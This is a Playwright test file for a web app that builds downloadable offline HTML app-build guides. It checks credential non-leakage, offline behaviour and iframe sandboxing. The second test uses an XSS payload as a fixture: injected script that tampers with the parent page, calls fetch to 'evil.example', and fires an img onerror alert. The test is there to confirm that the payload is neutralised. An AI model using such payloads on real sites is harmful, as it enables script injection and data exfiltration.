import { expect, test } from "@playwright/test";
import { readFile } from "node:fs/promises";
import { pathToFileURL } from "node:url";
import fixture from "./fixtures/build-guide.json";
import type { AiProject, AiSnapshot } from "../../src/lib/templates/ai-contract";
import { parseBuildGuide } from "../../src/lib/templates/guide-contract";
import { buildGuideHtml } from "../../src/lib/templates/guide-html";

test("paid customer generates, restores, previews and downloads a working offline guide without leaking purchase credentials", async ({ page, context }, testInfo) => {
  const token = "ab".repeat(32), order = "cs_test_1234567890abcdef";
  const project: AiProject = { brief: fixture.brief, plan: fixture.plan, revision: 1, appliedRevision: null, appliedBrief: null, appliedPlan: null, history: [] };
  const state: AiSnapshot = { used: 0, remaining: 20, limit: 20, pending: false, projects: { "mobile-app": project }, overviewUsed: ["mobile-app"], guideUsed: [] };
  let generations = 0, requested = false;
  await page.route("**/api/templates/library/**", (route) => route.fulfill({ json: { templates: [{ id: "mobile-app", foundation: "PAID_MOBILE_FOUNDATION" }], subagents: true, subagentInstructions: "PAID_TEAMWORK" } }));
  await page.route("**/api/templates/ai/**", async (route) => {
    const body = route.request().postDataJSON();
    if (body.action === "guide") { generations++; requested = true; state.pending = true; state.pendingKind = "guide"; }
    if (body.action === "load" && requested) {
      requested = false; state.pending = false; delete state.pendingKind; state.guideUsed = ["mobile-app"];
      project.guide = { id: "fixture-guide", generatedAt: "2026-09-23T00:00:00Z", sourceRevision: 1, brief: fixture.brief, plan: fixture.plan, document: parseBuildGuide(fixture.document, fixture.plan) };
      project.appliedRevision = 1; project.appliedBrief = project.brief; project.appliedPlan = project.plan;
    }
    if (body.action === "message") { project.revision = 2; state.remaining = 19; state.used = 1; project.history.push({ role: "assistant", text: "Plan updated" }); }
    await route.fulfill({ json: { available: true, state } });
  });
  await page.goto(`/templates/library/#session_id=${order}&access=${token}`);
  await expect(page.getByLabel("App name")).toHaveValue("BoulderMe");
  await expect(page.getByRole("button", { name: "Create my complete build guide", exact: true })).toBeDisabled();
  await page.getByLabel("Send my brief and messages to OpenAI").check();
  await page.getByRole("button", { name: "Create my complete build guide", exact: true }).click();
  await expect(page.getByText("Your complete guide is being prepared.", { exact: false })).toBeVisible();
  await expect(page.getByRole("button", { name: "Download complete HTML guide" })).toBeVisible({ timeout: 12_000 });
  await expect(page.locator("#full-prompt")).toContainText("DETAILED BUILD GUIDE");
  await expect(page.getByText("20 of 20 messages left")).toBeVisible();
  await page.reload();
  await page.getByRole("button", { name: "Preview guide & prototype" }).click();
  const frame = page.frameLocator("#guide-preview");
  await expect(frame.getByRole("heading", { level: 1 })).toHaveText("BoulderMe: your build guide");
  expect(await page.locator("#guide-preview").getAttribute("sandbox")).not.toContain("allow-same-origin");
  await frame.getByRole("button", { name: "View Alex", exact: true }).click();
  await expect(frame.getByRole("heading", { name: "Meet Alex", exact: true })).toBeVisible();
  await frame.getByRole("button", { name: "Invite to climb", exact: true }).click();
  await frame.getByRole("button", { name: "Accept invitation", exact: true }).click();
  await expect(frame.locator("#prototype-status")).toHaveText("Simulated acceptance. No database record was changed.");
  await page.getByLabel("Include subagent workflow").uncheck();
  await page.getByRole("radio", { name: "Make AI control my computer", exact: false }).check();
  const downloaded = page.waitForEvent("download");
  await page.getByRole("button", { name: "Download complete HTML guide" }).click();
  const download = await downloaded;
  expect(download.suggestedFilename()).toBe("boulderme-complete-guide.html");
  const path = testInfo.outputPath(download.suggestedFilename()); await download.saveAs(path);
  const html = await readFile(path, "utf8");
  expect(html).toContain("PAID_MOBILE_FOUNDATION"); expect(html).toContain("WORKING MODE: AI CONTROLS MY COMPUTER");
  expect(html).not.toContain("PAID_TEAMWORK"); expect(html).not.toContain(order); expect(html).not.toContain(token);
  const offline = await context.newPage();
  const external: string[] = []; offline.on("request", (r) => { if (r.url().startsWith("http")) external.push(r.url()); });
  await offline.goto(pathToFileURL(path).href);
  await offline.getByLabel("I checked this result").first().check();
  await offline.reload(); await expect(offline.getByLabel("I checked this result").first()).toBeChecked();
  await offline.getByRole("button", { name: "View Alex", exact: true }).click();
  await expect(offline.getByRole("heading", { name: "Meet Alex", exact: true })).toBeVisible();
  await offline.getByRole("button", { name: "Reset prototype" }).click();
  await expect(offline.getByRole("heading", { name: "Find your climbing partner", exact: true })).toBeVisible();
  await offline.screenshot({ path: "/tmp/runit-complete-guide-desktop.png", fullPage: true });
  await offline.setViewportSize({ width: 390, height: 844 });
  expect(await offline.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth)).toBe(true);
  await offline.locator("#prototype").screenshot({ path: "/tmp/runit-complete-guide-mobile.png" });
  expect(external).toEqual([]);
  await offline.close();
  await page.getByLabel("Send my brief and messages to OpenAI").check();
  await page.getByLabel("What would you like to change?").fill("Add email reminders");
  await page.getByRole("button", { name: "Send message", exact: true }).click();
  await expect(page.getByText("This guide belongs to an earlier plan or brief.", { exact: false })).toBeVisible();
  await expect(page.locator("#full-prompt")).not.toContainText("DETAILED BUILD GUIDE");
  await expect(page.getByRole("button", { name: "Download complete HTML guide" })).toBeEnabled();
  expect(generations).toBe(1);
});

test("prototype cannot execute model-supplied markup, read parent storage or initiate network calls", async ({ page }) => {
  const guide = parseBuildGuide(fixture.document, fixture.plan);
  const attack = '</textarea><script>parent.document.body.dataset.pwned="yes";fetch("https://evil.example")</script><img src=x onerror="alert(1)">';
  guide.title = attack; guide.screens[0].actions[0].feedback = attack;
  const html = buildGuideHtml({ id: "attack", generatedAt: "2026-09-23", sourceRevision: 1, brief: fixture.brief, plan: fixture.plan, document: guide }, attack);
  await page.goto("/templates/");
  await page.evaluate((srcdoc) => { const frame = document.createElement("iframe"); frame.id = "attack"; frame.sandbox.add("allow-scripts"); frame.srcdoc = srcdoc; document.body.replaceChildren(frame); }, html);
  const frame = page.frameLocator("#attack");
  await expect(frame.getByRole("heading", { level: 1 })).toHaveText(attack);
  await frame.getByRole("button", { name: "View Alex", exact: true }).click();
  await expect(frame.locator("#prototype-status")).toHaveText(attack);
  expect(await page.evaluate(() => document.body.dataset.pwned)).toBeUndefined();
  expect(await page.frames()[1].evaluate(() => { try { return parent.document.body.innerHTML; } catch { return "blocked"; } })).toBe("blocked");
});
